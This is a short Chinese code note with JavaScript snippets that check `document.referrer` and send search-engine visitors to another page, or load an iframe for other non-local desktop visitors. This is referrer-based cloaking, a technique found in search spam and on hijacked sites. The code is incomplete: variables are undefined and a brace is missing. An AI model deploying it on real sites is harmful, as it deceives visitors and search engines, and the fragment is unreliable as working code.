# 判断来路进行跳转

```javascript
var regexp=/\.(sogou|soso|baidu|google|so)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referrer;
if(regexp.test(where))
{
window.location.href='demo.html'
}
```


```javascript
if (browser.versions.android){
	
}else if(browser.versions.iPhone||browser.versions.iPad){
		
}else{
	var localDomain = location.host;
	var sourceUrl = document.referrer;
	var sourceDomain = /[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+\.?/.exec(sourceUrl);
	if(!sourceDomain || sourceDomain[0] != localDomain){
		var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|haoso|so|360)(\.[a-z0-9\-]+){1,2}\//ig;
		var where =document.referrer;
		if(regexp.test(where))
		{
			
		}else{
			document.writeln('<IFRAME align=middle marginwidth=0 vspace=-0 marginheight=0 src="'+url+'" frameborder=no width="100%" scrolling=no height=800>');
		}
}
 
